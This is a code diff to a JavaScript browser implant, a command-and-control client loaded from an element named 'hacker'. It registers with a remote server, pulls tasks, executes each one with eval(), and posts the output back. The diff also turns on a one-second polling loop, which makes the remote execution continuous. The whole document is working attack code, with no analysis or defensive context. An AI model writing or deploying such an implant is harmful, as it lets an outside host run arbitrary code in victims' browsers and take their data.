@@ -2,13 +2,9 @@ var clientid = null;
 var scriptsrc = document.getElementById("hacker").getAttribute("src");
 var c2server = scriptsrc.substring(0, scriptsrc.length - 11);
 
-
 function run() {
-    // make Ajax call here, inside the callback call:
-
     function register() {
         //register client with server in order to obtain client id
-
         console.debug("[*] registering client with c2server at:" + c2server + "/api/register");
         var xhttp = new XMLHttpRequest();
         xhttp.onreadystatechange = function () {
@@ -27,7 +23,7 @@ function run() {
             if (getTaskRequest.readyState == 4 && getTaskRequest.status == 201) {
                 var jsondata = JSON.parse(getTaskRequest.responseText);
                 for (var i in jsondata.tasks) {
-                    console.debug("[*] got task " + jsondata.tasks[i].id + ": " + jsondata.tasks[i].input)
+                    console.debug("[*] Received task " + jsondata.tasks[i].id + ": " + jsondata.tasks[i].input)
                     try{
                         var cmdout = eval(jsondata.tasks[i].input); //do the task
                     }
@@ -39,7 +35,7 @@ function run() {
                     var taskCompleteRequest = new XMLHttpRequest();
                     taskCompleteRequest.onreadystatechange = function () {
                         if (taskCompleteRequest.readyState == 4 && taskCompleteRequest.status == 201) {
-                            console.debug("[*] task complete: " + jsondata.tasks[i].id)
+                            console.debug("[*] Task complete: " + jsondata.tasks[i].id)
                         }
                     };
                     taskCompleteRequest.open("POST", c2server + "/api/client/"+String(clientid)+"/task/"+jsondata.tasks[i].id+"/output", true);
@@ -47,15 +43,11 @@ function run() {
                     var taskoutput = {tasks:[{output:String(cmdout)}]}
                     var outputjson = JSON.stringify(taskoutput);
                     taskCompleteRequest.send(outputjson); //log output remotely
-
                 }
-
-
             }
         };
         getTaskRequest.open("GET", c2server + "/api/tasks/" + clientid, true);
         getTaskRequest.send();
-        console.debug("[*] looking for tasks: " + clientid)
     }
 
     if (clientid == null) {
@@ -63,7 +55,6 @@ function run() {
     }
     console.debug("[*] ping")
     getTasks();
-    // setTimeout(poll, 5000); //uncomment this for prod
-    // ...
+    setTimeout(run, 1000);
 }
 run();
